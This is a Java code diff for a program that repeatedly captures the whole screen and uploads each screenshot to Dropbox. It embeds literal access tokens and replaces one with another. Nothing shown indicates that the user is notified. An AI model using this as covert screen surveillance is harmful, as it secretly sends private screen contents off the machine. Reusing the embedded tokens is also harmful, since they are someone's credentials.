@@ -20,7 +20,7 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.TimeUnit;
 
 public class MainClass {
-    private final String TOKEN = "FUSok_L5WJAAAAAAAAAAAbsK25q2kQHTUv9zvRpDHdBXAA-jCiKQxQtn4YyS4clG";
+    private final String TOKEN = "WC8AFF8My1AAAAAAAAAAAXAZd3Y4brEuiz88I7ZgI-BAFpyJLoC2HmDInnkzw_a6";
     private final BlockingQueue<String> queue = new ArrayBlockingQueue<>(10);
 
     private Thread objDelay = null;
@@ -52,10 +52,11 @@ public class MainClass {
 
         @Override
         public void run() {
+            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
             try {
                 while (lifeParent.isAlive()) {
                     Thread.sleep(timeDelay);
-                    queue.add("");
+                    queue.add(dateFormat.format(new Date()));
                 }
             } catch (InterruptedException e) {
                 System.out.println("crash class delay: " + e.getMessage());
@@ -77,33 +78,31 @@ public class MainClass {
 
             ByteArrayOutputStream outputStream = null;
             InputStream inputStream = null;
-            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
-            String next;
-            while (lifeParent.isAlive()) {
-                try {
-                    next = queue.poll(1, TimeUnit.SECONDS);
-                    if (next == null) continue;
+            String data;
+            try {
+                while (lifeParent.isAlive()) {
+                    data = queue.poll(1, TimeUnit.SECONDS);
+                    if (data == null) continue;
 
                     image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
-                    String data = dateFormat.format(new Date());
                     outputStream = new ByteArrayOutputStream();
                     ImageIO.write(image, "png", outputStream);
                     inputStream = new ByteArrayInputStream(outputStream.toByteArray());
 
                     FileMetadata metadata = client.files().uploadBuilder("/" + data + ".png").uploadAndFinish(inputStream);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                } catch (AWTException e) {
-                    e.printStackTrace();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                } catch (UploadErrorException e) {
-                    e.printStackTrace();
-                } catch (DbxException e) {
-                    e.printStackTrace();
-                } catch (java.lang.Throwable e) {
-                    System.out.println("упс " + e.getMessage());
                 }
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            } catch (AWTException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (UploadErrorException e) {
+                e.printStackTrace();
+            } catch (DbxException e) {
+                e.printStackTrace();
+            } catch (java.lang.Throwable e) {
+                System.out.println("упс " + e.getMessage());
             }
             System.out.println("stop");
         }
